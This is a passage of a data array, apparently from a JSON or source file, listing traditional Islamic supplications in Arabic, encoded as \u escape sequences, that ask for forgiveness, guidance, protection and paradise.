  "\u0627\u0644\u0644\u0647\u0645 \u0627\u063A\u0633\u0644 \u062E\u0637\u0627\u064A\u0627\u064A \u0628\u0645\u0627\u0621 \u0627\u0644\u062B\u0644\u062C \u0648\u0627\u0644\u0628\u0631\u062F\u060C \u0648\u0646\u0642 \u0642\u0644\u0628\u064A \u0645\u0646 \u0627\u0644\u062E\u0637\u0627\u064A\u0627 \u0643\u0645\u0627 \u0646\u0642\u064A\u062A \u0627\u0644\u062B\u0648\u0628 \u0627\u0644\u0623\u0628\u064A\u0636 \u0645\u0646 \u0627\u0644\u062F\u0646\u0633\u060C \u0648\u0628\u0627\u0639\u062F \u0628\u064A\u0646\u064A \u0648\u0628\u064A\u0646 \u062E\u0637\u0627\u064A\u0627\u064A \u0643\u0645\u0627 \u0628\u0627\u0639\u062F\u062A \u0628\u064A\u0646 \u0627\u0644\u0645\u0634\u0631\u0642 \u0648\u0627\u0644\u0645\u063A\u0631\u0628",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0643\u0633\u0644 \u0648\u0627\u0644\u0647\u0631\u0645 \u0648\u0627\u0644\u0645\u0623\u062B\u0645 \u0648\u0627\u0644\u0645\u063A\u0631\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0645\u0635\u0631\u0641 \u0627\u0644\u0642\u0644\u0648\u0628 \u0635\u0631\u0641 \u0642\u0644\u0648\u0628\u0646\u0627 \u0639\u0644\u0649 \u0637\u0627\u0639\u062A\u0643",
  "\u064A\u0627 \u0645\u0642\u0644\u0628 \u0627\u0644\u0642\u0644\u0648\u0628 \u062B\u0628\u062A \u0642\u0644\u0628\u064A \u0639\u0644\u0649 \u062F\u064A\u0646\u0643",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u0647\u062F\u0649 \u0648\u0627\u0644\u062A\u0642\u0649 \u0648\u0627\u0644\u0639\u0641\u0627\u0641 \u0648\u0627\u0644\u063A\u0646\u0649",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u063A\u0641\u0631 \u0644\u064A \u0648\u0627\u0631\u062D\u0645\u0646\u064A \u0648\u0627\u0647\u062F\u0646\u064A \u0648\u0639\u0627\u0641\u0646\u064A \u0648\u0627\u0631\u0632\u0642\u0646\u064A",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u062C\u0647\u062F \u0627\u0644\u0628\u0644\u0627\u0621\u060C \u0648\u062F\u0631\u0643 \u0627\u0644\u0634\u0642\u0627\u0621\u060C \u0648\u0633\u0648\u0621 \u0627\u0644\u0642\u0636\u0627\u0621\u060C \u0648\u0634\u0645\u0627\u062A\u0629 \u0627\u0644\u0623\u0639\u062F\u0627\u0621",
  "\u0627\u0644\u0644\u0647\u0645 \u0623\u0635\u0644\u062D \u0644\u064A \u062F\u064A\u0646\u064A \u0627\u0644\u0630\u064A \u0647\u0648 \u0639\u0635\u0645\u0629 \u0623\u0645\u0631\u064A\u060C \u0648\u0623\u0635\u0644\u062D \u0644\u064A \u062F\u0646\u064A\u0627\u064A \u0627\u0644\u062A\u064A \u0641\u064A\u0647\u0627 \u0645\u0639\u0627\u0634\u064A\u060C \u0648\u0623\u0635\u0644\u062D \u0644\u064A \u0622\u062E\u0631\u062A\u064A \u0627\u0644\u062A\u064A \u0641\u064A\u0647\u0627 \u0645\u0639\u0627\u062F\u064A\u060C \u0648\u0627\u062C\u0639\u0644 \u0627\u0644\u062D\u064A\u0627\u0629 \u0632\u064A\u0627\u062F\u0629 \u0644\u064A \u0641\u064A \u0643\u0644 \u062E\u064A\u0631\u060C \u0648\u0627\u062C\u0639\u0644 \u0627\u0644\u0645\u0648\u062A \u0631\u0627\u062D\u0629 \u0644\u064A \u0645\u0646 \u0643\u0644 \u0634\u0631",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0645\u0646 \u0627\u0644\u062E\u064A\u0631 \u0643\u0644\u0647 \u0639\u0627\u062C\u0644\u0647 \u0648\u0622\u062C\u0644\u0647 \u0645\u0627 \u0639\u0644\u0645\u062A \u0645\u0646\u0647 \u0648\u0645\u0627 \u0644\u0645 \u0623\u0639\u0644\u0645\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0634\u0631 \u0643\u0644\u0647 \u0639\u0627\u062C\u0644\u0647 \u0648\u0622\u062C\u0644\u0647 \u0645\u0627 \u0639\u0644\u0645\u062A \u0645\u0646\u0647 \u0648\u0645\u0627 \u0644\u0645 \u0623\u0639\u0644\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0645\u0646 \u062E\u064A\u0631 \u0645\u0627 \u0633\u0623\u0644\u0643 \u0639\u0628\u062F\u0643 \u0648\u0646\u0628\u064A\u0643\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0645\u0627 \u0639\u0627\u0630 \u0628\u0647 \u0639\u0628\u062F\u0643 \u0648\u0646\u0628\u064A\u0643",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u062C\u0646\u0629 \u0648\u0645\u0627 \u0642\u0631\u0628 \u0625\u0644\u064A\u0647\u0627 \u0645\u0646 \u0642\u0648\u0644 \u0623\u0648 \u0639\u0645\u0644\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0646\u0627\u0631 \u0648\u0645\u0627 \u0642\u0631\u0628 \u0625\u0644\u064A\u0647\u0627 \u0645\u0646 \u0642\u0648\u0644 \u0623\u0648 \u0639\u0645\u0644\u060C \u0648\u0623\u0633\u0623\u0644\u0643 \u0623\u0646 \u062A\u062C\u0639\u0644 \u0643\u0644 \u0642\u0636\u0627\u0621 \u0642\u0636\u064A\u062A\u0647 \u0644\u064A \u062E\u064A\u0631\u0627\u064B",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0639\u0644\u0645 \u0644\u0627 \u064A\u0646\u0641\u0639\u060C \u0648\u0645\u0646 \u0642\u0644\u0628 \u0644\u0627 \u064A\u062E\u0634\u0639\u060C \u0648\u0645\u0646 \u0646\u0641\u0633 \u0644\u0627 \u062A\u0634\u0628\u0639\u060C \u0648\u0645\u0646 \u062F\u0639\u0648\u0629 \u0644\u0627 \u064A\u0633\u062A\u062C\u0627\u0628 \u0644\u0647\u0627",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u0643\u0641\u0646\u064A \u0628\u062D\u0644\u0627\u0644\u0643 \u0639\u0646 \u062D\u0631\u0627\u0645\u0643\u060C \u0648\u0623\u063A\u0646\u0646\u064A \u0628\u0641\u0636\u0644\u0643 \u0639\u0645\u0646 \u0633\u0648\u0627\u0643",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u062B\u0628\u0627\u062A \u0641\u064A \u0627\u0644\u0623\u0645\u0631\u060C \u0648\u0627\u0644\u0639\u0632\u064A\u0645\u0629 \u0639\u0644\u0649 \u0627\u0644\u0631\u0634\u062F\u060C \u0648\u0623\u0633\u0623\u0644\u0643 \u0645\u0648\u062C\u0628\u0627\u062A \u0631\u062D\u0645\u062A\u0643\u060C \u0648\u0639\u0632\u0627\u0626\u0645 \u0645\u063A\u0641\u0631\u062A\u0643\u060C \u0648\u0623\u0633\u0623\u0644\u0643 \u0634\u0643\u0631 \u0646\u0639\u0645\u062A\u0643\u060C \u0648\u062D\u0633\u0646 \u0639\u0628\u0627\u062F\u062A\u0643\u060C \u0648\u0623\u0633\u0623\u0644\u0643 \u0642\u0644\u0628\u0627\u064B \u0633\u0644\u064A\u0645\u0627\u064B\u060C \u0648\u0644\u0633\u0627\u0646\u0627\u064B \u0635\u0627\u062F\u0642\u0627\u064B\u060C \u0648\u0623\u0633\u0623\u0644\u0643 \u0645\u0646 \u062E\u064A\u0631 \u0645\u0627 \u062A\u0639\u0644\u0645\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0645\u0627 \u062A\u0639\u0644\u0645\u060C \u0648\u0623\u0633\u062A\u063A\u0641\u0631\u0643 \u0644\u0645\u0627 \u062A\u0639\u0644\u0645\u060C \u0625\u0646\u0643 \u0623\u0646\u062A \u0639\u0644\u0627\u0645 \u0627\u0644\u063A\u064A\u0648\u0628",
  "\u0627\u0644\u0644\u0647\u0645 \u0631\u0628 \u0627\u0644\u0633\u0645\u0627\u0648\u0627\u062A \u0648\u0631\u0628 \u0627\u0644\u0623\u0631\u0636 \u0648\u0631\u0628 \u0627\u0644\u0639\u0631\u0634 \u0627\u0644\u0639\u0638\u064A\u0645\u060C \u0631\u0628\u0646\u0627 \u0648\u0631\u0628 \u0643\u0644 \u0634\u064A\u0621\u060C \u0641\u0627\u0644\u0642 \u0627\u0644\u062D\u0628 \u0648\u0627\u0644\u0646\u0648\u0649\u060C \u0648\u0645\u0646\u0632\u0644 \u0627\u0644\u062A\u0648\u0631\u0627\u0629 \u0648\u0627\u0644\u0625\u0646\u062C\u064A\u0644 \u0648\u0627\u0644\u0641\u0631\u0642\u0627\u0646\u060C \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0643\u0644 \u0634\u064A\u0621 \u0623\u0646\u062A \u0622\u062E\u0630 \u0628\u0646\u0627\u0635\u064A\u062A\u0647\u060C \u0627\u0644\u0644\u0647\u0645 \u0623\u0646\u062A \u0627\u0644\u0623\u0648\u0644 \u0641\u0644\u064A\u0633 \u0642\u0628\u0644\u0643 \u0634\u064A\u0621\u060C \u0648\u0623\u0646\u062A \u0627\u0644\u0622\u062E\u0631 \u0641\u0644\u064A\u0633 \u0628\u0639\u062F\u0643 \u0634\u064A\u0621\u060C \u0648\u0623\u0646\u062A \u0627\u0644\u0638\u0627\u0647\u0631 \u0641\u0644\u064A\u0633 \u0641\u0648\u0642\u0643 \u0634\u064A\u0621\u060C \u0648\u0623\u0646\u062A \u0627\u0644\u0628\u0627\u0637\u0646 \u0641\u0644\u064A\u0633 \u062F\u0648\u0646\u0643 \u0634\u064A\u0621\u060C \u0627\u0642\u0636 \u0639\u0646\u0627 \u0627\u0644\u062F\u064A\u0646 \u0648\u0623\u063A\u0646\u0646\u0627 \u0645\u0646 \u0627\u0644\u0641\u0642\u0631",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u063A\u0641\u0631 \u0644\u064A \u0630\u0646\u0628\u064A \u0643\u0644\u0647\u060C \u062F\u0642\u0647 \u0648\u062C\u0644\u0647\u060C \u0648\u0623\u0648\u0644\u0647 \u0648\u0622\u062E\u0631\u0647\u060C \u0648\u0639\u0644\u0627\u0646\u064A\u062A\u0647 \u0648\u0633\u0631\u0647",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0631\u0636\u0627\u0643 \u0645\u0646 \u0633\u062E\u0637\u0643\u060C \u0648\u0628\u0645\u0639\u0627\u0641\u0627\u062A\u0643 \u0645\u0646 \u0639\u0642\u0648\u0628\u062A\u0643\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646\u0643 \u0644\u0627 \u0623\u062D\u0635\u064A \u062B\u0646\u0627\u0621 \u0639\u0644\u064A\u0643 \u0623\u0646\u062A \u0643\u0645\u0627 \u0623\u062B\u0646\u064A\u062A \u0639\u0644\u0649 \u0646\u0641\u0633\u0643",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0628\u0631\u0635 \u0648\u0627\u0644\u062C\u0646\u0648\u0646 \u0648\u0627\u0644\u062C\u0630\u0627\u0645 \u0648\u0645\u0646 \u0633\u064A\u0626 \u0627\u0644\u0623\u0633\u0642\u0627\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0645\u0646\u0643\u0631\u0627\u062A \u0627\u0644\u0623\u062E\u0644\u0627\u0642 \u0648\u0627\u0644\u0623\u0639\u0645\u0627\u0644 \u0648\u0627\u0644\u0623\u0647\u0648\u0627\u0621",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u0643 \u0639\u0641\u0648 \u0643\u0631\u064A\u0645 \u062A\u062D\u0628 \u0627\u0644\u0639\u0641\u0648 \u0641\u0627\u0639\u0641 \u0639\u0646\u064A",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u062D\u0628\u0643 \u0648\u062D\u0628 \u0645\u0646 \u064A\u062D\u0628\u0643 \u0648\u0627\u0644\u0639\u0645\u0644 \u0627\u0644\u0630\u064A \u064A\u0628\u0644\u063A\u0646\u064A \u062D\u0628\u0643",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u062C\u0639\u0644 \u062D\u0628\u0643 \u0623\u062D\u0628 \u0625\u0644\u064A \u0645\u0646 \u0646\u0641\u0633\u064A \u0648\u0623\u0647\u0644\u064A \u0648\u0645\u0646 \u0627\u0644\u0645\u0627\u0621 \u0627\u0644\u0628\u0627\u0631\u062F",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0641\u0648\u0627\u062A\u062D \u0627\u0644\u062E\u064A\u0631 \u0648\u062E\u0648\u0627\u062A\u0645\u0647 \u0648\u062C\u0648\u0627\u0645\u0639\u0647 \u0648\u0623\u0648\u0644\u0647 \u0648\u0622\u062E\u0631\u0647 \u0648\u0638\u0627\u0647\u0631\u0647 \u0648\u0628\u0627\u0637\u0646\u0647 \u0648\u0627\u0644\u062F\u0631\u062C\u0627\u062A \u0627\u0644\u0639\u0644\u0649 \u0645\u0646 \u0627\u0644\u062C\u0646\u0629",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0623\u0646 \u062A\u0631\u0641\u0639 \u0630\u0643\u0631\u064A \u0648\u062A\u0636\u0639 \u0648\u0632\u0631\u064A \u0648\u062A\u0637\u0647\u0631 \u0642\u0644\u0628\u064A \u0648\u062A\u0635\u0646 \u0641\u0631\u062C\u064A \u0648\u062A\u063A\u0641\u0631 \u0644\u064A \u0630\u0646\u0628\u064A \u0648\u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u062F\u0631\u062C\u0627\u062A \u0627\u0644\u0639\u0644\u0649 \u0645\u0646 \u0627\u0644\u062C\u0646\u0629",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0623\u0646 \u062A\u0628\u0627\u0631\u0643 \u0641\u064A \u0646\u0641\u0633\u064A \u0648\u0641\u064A \u0633\u0645\u0639\u064A \u0648\u0641\u064A \u0628\u0635\u0631\u064A \u0648\u0641\u064A \u0631\u0648\u062D\u064A \u0648\u0641\u064A \u062E\u0644\u0642\u064A \u0648\u0641\u064A \u062E\u0644\u0642\u064A \u0648\u0641\u064A \u0623\u0647\u0644\u064A \u0648\u0641\u064A \u0645\u062D\u064A\u0627\u064A \u0648\u0641\u064A \u0645\u0645\u0627\u062A\u064A \u0648\u0641\u064A \u0639\u0645\u0644\u064A \u0641\u062A\u0642\u0628\u0644 \u062D\u0633\u0646\u0627\u062A\u064A \u0648\u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u062F\u0631\u062C\u0627\u062A \u0627\u0644\u0639\u0644\u0649 \u0645\u0646 \u0627\u0644\u062C\u0646\u0629",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0645\u0627 \u0639\u0645\u0644\u062A \u0648\u0645\u0646 \u0634\u0631 \u0645\u0627 \u0644\u0645 \u0623\u0639\u0645\u0644",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u063A\u0644\u0628\u0629 \u0627\u0644\u062F\u064A\u0646 \u0648\u063A\u0644\u0628\u0629 \u0627\u0644\u0639\u062F\u0648 \u0648\u0634\u0645\u0627\u062A\u0629 \u0627\u0644\u0623\u0639\u062F\u0627\u0621",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u063A\u0641\u0631 \u0644\u064A \u0648\u0627\u0631\u062D\u0645\u0646\u064A \u0648\u0623\u0644\u062D\u0642\u0646\u064A \u0628\u0627\u0644\u0631\u0641\u064A\u0642 \u0627\u0644\u0623\u0639\u0644\u0649",
  "\u0627\u0644\u0644\u0647\u0645 \u0622\u062A\u0646\u0627 \u0641\u064A \u0627\u0644\u062F\u0646\u064A\u0627 \u062D\u0633\u0646\u0629 \u0648\u0641\u064A \u0627\u0644\u0622\u062E\u0631\u0629 \u062D\u0633\u0646\u0629 \u0648\u0642\u0646\u0627 \u0639\u0630\u0627\u0628 \u0627\u0644\u0646\u0627\u0631",
  "\u0633\u064F\u0628\u0652\u062D\u064E\u0627\u0646\u064E \u0627\u0644\u0644\u0647\u0650 \u0648\u064E\u0628\u0650\u062D\u064E\u0645\u0652\u062F\u0650\u0647\u0650: \u0639\u064E\u062F\u064E\u062F\u064E \u062E\u064E\u0644\u0652\u0642\u0650\u0647\u0650\u060C \u0648\u064E\u0631\u0650\u0636\u064E\u0627 \u0646\u064E\u0641\u0652\u0633\u0650\u0647\u0650\u060C \u0648\u064E\u0632\u0650\u0646\u064E\u0629\u064E \u0639\u064E\u0631\u0652\u0634\u0650\u0647\u0650\u060C \u0648\u064E\u0645\u0650\u062F\u064E\u0627\u062F\u064E \u0643\u064E\u0644\u0650\u0645\u064E\u0627\u062A\u0650\u0647\u0650",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0641\u0642\u0631 \u0648\u0627\u0644\u0642\u0644\u0629 \u0648\u0627\u0644\u0630\u0644\u0629\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0623\u0646 \u0623\u0638\u0644\u0645 \u0623\u0648 \u0623\u0638\u0644\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u062C\u0627\u0631 \u0627\u0644\u0633\u0648\u0621 \u0641\u064A \u062F\u0627\u0631 \u0627\u0644\u0645\u0642\u0627\u0645\u0629 \u0641\u0625\u0646 \u062C\u0627\u0631 \u0627\u0644\u0628\u0627\u062F\u064A\u0629 \u064A\u062A\u062D\u0648\u0644",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0642\u0644\u0628 \u0644\u0627 \u064A\u062E\u0634\u0639 \u0648\u0645\u0646 \u062F\u0639\u0627\u0621 \u0644\u0627 \u064A\u0633\u0645\u0639 \u0648\u0645\u0646 \u0646\u0641\u0633 \u0644\u0627 \u062A\u0634\u0628\u0639 \u0648\u0645\u0646 \u0639\u0644\u0645 \u0644\u0627 \u064A\u0646\u0641\u0639\u060C \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0647\u0624\u0644\u0627\u0621 \u0627\u0644\u0623\u0631\u0628\u0639",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u064A\u0648\u0645 \u0627\u0644\u0633\u0648\u0621 \u0648\u0645\u0646 \u0644\u064A\u0644\u0629 \u0627\u0644\u0633\u0648\u0621 \u0648\u0645\u0646 \u0633\u0627\u0639\u0629 \u0627\u0644\u0633\u0648\u0621 \u0648\u0645\u0646 \u0635\u0627\u062D\u0628 \u0627\u0644\u0633\u0648\u0621 \u0648\u0645\u0646 \u062C\u0627\u0631 \u0627\u0644\u0633\u0648\u0621 \u0641\u064A \u062F\u0627\u0631 \u0627\u0644\u0645\u0642\u0627\u0645\u0629",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u062C\u0646\u0629 \u0648\u0623\u0633\u062A\u062C\u064A\u0631 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0646\u0627\u0631",
  "\u0627\u0644\u0644\u0647\u0645 \u0641\u0642\u0647\u0646\u064A \u0641\u064A \u0627\u0644\u062F\u064A\u0646",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0623\u0646 \u0623\u0634\u0631\u0643 \u0628\u0643 \u0648\u0623\u0646\u0627 \u0623\u0639\u0644\u0645 \u0648\u0623\u0633\u062A\u063A\u0641\u0631\u0643 \u0644\u0645\u0627 \u0644\u0627 \u0623\u0639\u0644\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u0646\u0641\u0639\u0646\u064A \u0628\u0645\u0627 \u0639\u0644\u0645\u062A\u0646\u064A \u0648\u0639\u0644\u0645\u0646\u064A \u0645\u0627 \u064A\u0646\u0641\u0639\u0646\u064A \u0648\u0632\u062F\u0646\u064A \u0639\u0644\u0645\u0627\u064B",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0625\u064A\u0645\u0627\u0646\u0627\u064B \u0644\u0627 \u064A\u0631\u062A\u062F \u0648\u0646\u0639\u064A\u0645\u0627\u064B \u0644\u0627 \u064A\u0646\u0641\u062F \u0648\u0645\u0631\u0627\u0641\u0642\u0629 \u0645\u062D\u0645\u062F \u0635\u0644\u0649 \u0627\u0644\u0644\u0647 \u0639\u0644\u064A\u0647 \u0648\u0633\u0644\u0645 \u0641\u064A \u0623\u0639\u0644\u0649 \u062C\u0646\u0629 \u0627\u0644\u062E\u0644\u062F",
  "\u0627\u0644\u0644\u0647\u0645 \u0642\u0646\u064A \u0634\u0631 \u0646\u0641\u0633\u064A \u0648\u0627\u0639\u0632\u0645 \u0644\u064A \u0639\u0644\u0649 \u0623\u0631\u0634\u062F \u0623\u0645\u0631\u064A",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u063A\u0641\u0631 \u0644\u064A \u0645\u0627 \u0623\u0633\u0631\u0631\u062A \u0648\u0645\u0627 \u0623\u0639\u0644\u0646\u062A \u0648\u0645\u0627 \u0623\u062E\u0637\u0623\u062A \u0648\u0645\u0627 \u0639\u0645\u062F\u062A \u0648\u0645\u0627 \u0639\u0644\u0645\u062A \u0648\u0645\u0627 \u062C\u0647\u0644\u062A",
  "\u0627\u0644\u0644\u0647\u0645 \u062D\u0627\u0633\u0628\u0646\u064A \u062D\u0633\u0627\u0628\u0627\u064B \u064A\u0633\u064A\u0631\u0627\u064B",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0641\u0639\u0644 \u0627\u0644\u062E\u064A\u0631\u0627\u062A \u0648\u062A\u0631\u0643 \u0627\u0644\u0645\u0646\u0643\u0631\u0627\u062A \u0648\u062D\u0628 \u0627\u0644\u0645\u0633\u0627\u0643\u064A\u0646 \u0648\u0623\u0646 \u062A\u063A\u0641\u0631 \u0644\u064A \u0648\u062A\u0631\u062D\u0645\u0646\u064A \u0648\u0625\u0630\u0627 \u0623\u0631\u062F\u062A \u0641\u062A\u0646\u0629 \u0642\u0648\u0645 \u0641\u062A\u0648\u0641\u0646\u064A \u063A\u064A\u0631 \u0645\u0641\u062A\u0648\u0646",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u062D\u0628\u0643 \u0648\u062D\u0628 \u0645\u0646 \u064A\u062D\u0628\u0643 \u0648\u062D\u0628 \u0639\u0645\u0644 \u064A\u0642\u0631\u0628\u0646\u064A \u0625\u0644\u0649 \u062D\u0628\u0643",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u062E\u064A\u0631 \u0627\u0644\u0645\u0633\u0623\u0644\u0629 \u0648\u062E\u064A\u0631 \u0627\u0644\u062F\u0639\u0627\u0621 \u0648\u062E\u064A\u0631 \u0627\u0644\u0646\u062C\u0627\u062D \u0648\u062E\u064A\u0631 \u0627\u0644\u0639\u0645\u0644 \u0648\u062E\u064A\u0631 \u0627\u0644\u062B\u0648\u0627\u0628 \u0648\u062E\u064A\u0631 \u0627\u0644\u062D\u064A\u0627\u0629 \u0648\u062E\u064A\u0631 \u0627\u0644\u0645\u0645\u0627\u062A \u0648\u062B\u0628\u062A\u0646\u064A \u0648\u062B\u0642\u0644 \u0645\u0648\u0627\u0632\u064A\u0646\u064A \u0648\u062D\u0642\u0642 \u0625\u064A\u0645\u0627\u0646\u064A \u0648\u0627\u0631\u0641\u0639 \u062F\u0631\u062C\u0627\u062A\u064A \u0648\u062A\u0642\u0628\u0644 \u0635\u0644\u0627\u062A\u064A \u0648\u0627\u063A\u0641\u0631 \u062E\u0637\u064A\u0626\u062A\u064A \u0648\u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u062F\u0631\u062C\u0627\u062A \u0627\u0644\u0639\u0644\u0649 \u0645\u0646 \u0627\u0644\u062C\u0646\u0629",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u0647\u062F\u0649 \u0648\u0627\u0644\u0633\u062F\u0627\u062F",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0639\u062C\u0632 \u0648\u0627\u0644\u0643\u0633\u0644 \u0648\u0627\u0644\u062C\u0628\u0646 \u0648\u0627\u0644\u0628\u062E\u0644 \u0648\u0627\u0644\u0647\u0631\u0645 \u0648\u0639\u0630\u0627\u0628 \u0627\u0644\u0642\u0628\u0631",
  "\u0627\u0644\u0644\u0647\u0645 \u0622\u062A \u0646\u0641\u0633\u064A \u062A\u0642\u0648\u0627\u0647\u0627 \u0648\u0632\u0643\u0647\u0627 \u0623\u0646\u062A \u062E\u064A\u0631 \u0645\u0646 \u0632\u0643\u0627\u0647\u0627 \u0623\u0646\u062A \u0648\u0644\u064A\u0647\u0627 \u0648\u0645\u0648\u0644\u0627\u0647\u0627",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0639\u0644\u0645 \u0644\u0627 \u064A\u0646\u0641\u0639 \u0648\u0645\u0646 \u0642\u0644\u0628 \u0644\u0627 \u064A\u062E\u0634\u0639 \u0648\u0645\u0646 \u0646\u0641\u0633 \u0644\u0627 \u062A\u0634\u0628\u0639 \u0648\u0645\u0646 \u062F\u0639\u0648\u0629 \u0644\u0627 \u064A\u0633\u062A\u062C\u0627\u0628 \u0644\u0647\u0627",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0633\u0645\u0639\u064A \u0648\u0645\u0646 \u0634\u0631 \u0628\u0635\u0631\u064A \u0648\u0645\u0646 \u0634\u0631 \u0644\u0633\u0627\u0646\u064A \u0648\u0645\u0646 \u0634\u0631 \u0642\u0644\u0628\u064A \u0648\u0645\u0646 \u0634\u0631 \u0645\u0646\u064A\u064A",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0647\u062F\u0645 \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u062A\u0631\u062F\u064A \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u063A\u0631\u0642 \u0648\u0627\u0644\u062D\u0631\u0642 \u0648\u0627\u0644\u0647\u0631\u0645 \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0623\u0646 \u064A\u062A\u062E\u0628\u0637\u0646\u064A \u0627\u0644\u0634\u064A\u0637\u0627\u0646 \u0639\u0646\u062F \u0627\u0644\u0645\u0648\u062A \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0623\u0646 \u0623\u0645\u0648\u062A \u0641\u064A \u0633\u0628\u064A\u0644\u0643 \u0645\u062F\u0628\u0631\u0627\u064B \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0623\u0646 \u0623\u0645\u0648\u062A \u0644\u062F\u064A\u063A\u0627\u064B",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u062C\u0648\u0639 \u0641\u0625\u0646\u0647 \u0628\u0626\u0633 \u0627\u0644\u0636\u062C\u064A\u0639 \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u062E\u064A\u0627\u0646\u0629 \u0641\u0625\u0646\u0647\u0627 \u0628\u0626\u0633\u062A \u0627\u0644\u0628\u0637\u0627\u0646\u0629",
